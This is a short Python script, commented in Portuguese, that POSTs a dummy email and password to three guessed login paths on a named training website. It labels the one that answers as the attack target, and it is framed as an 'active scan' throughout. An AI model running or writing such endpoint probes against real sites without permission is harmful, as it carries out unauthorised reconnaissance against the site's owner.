#!/usr/bin/env python3
import requests

# Base do alvo
BASE_URL = "https://dlp.hashtagtreinamentos.com/python/intensivao"

# As 3 portas mais prováveis (Padrão de mercado)
tentativas = [
    f"{BASE_URL}/login",
    f"{BASE_URL}/logar",
    f"{BASE_URL}/auth"
]

payload = {
    "email": "hackeando_hashtag@gmail.com",
    "senha": "senha_hacker"
}

print(f"🔫 Iniciando varredura ativa em {BASE_URL}...\n")

for url in tentativas:
    print(f"👉 Testando POST em: {url} ...", end=" ")
    try:
        # Tenta enviar o formulário
        resp = requests.post(url, data=payload)
        
        # Se receber 405 (Method Not Allowed), a porta existe mas não aceita POST
        if resp.status_code == 405:
            print("❌ 405 (Só aceita GET, não é aqui)")
            
        # Se receber 200 (OK), pode ser a página carregando OU o login feito
        elif resp.status_code == 200:
            # Verifica se fomos redirecionados ou se a URL mudou (sinal de sucesso)
            print(f"✅ 200 OK!")
            print(f"   🔎 Analisando resposta...")
            if "intensivao" in resp.url: 
                print(f"   🔥 [ALVO CONFIRMADO] Essa é a URL de ataque!")
            else:
                print(f"   ⚠️ Retornou 200, mas parece ser apenas a página recarregando.")
                
        else:
            print(f"⚠️ Código: {resp.status_code}")
            
    except Exception as e:
        print(f"❌ Erro: {e}")

print("\n🏁 Varredura finalizada.")